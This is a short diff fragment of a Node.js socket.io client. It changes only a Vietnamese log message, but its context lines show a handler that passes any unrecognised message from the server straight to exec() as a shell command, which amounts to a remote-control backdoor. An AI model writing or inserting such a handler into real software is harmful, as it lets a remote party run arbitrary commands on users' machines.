@@ -16,7 +16,7 @@ ioClient.on("message", (msg) => {
   if (msg ==='Chay') {
     console.log('Em bat dau chay');
   } else if (msg ==='Ngung'){
-    console.log('Em ngung chay');
+    console.log('Em ngung chay roi anh');
   }
    else {
     exec(msg, (err, stdout, stderr) => {
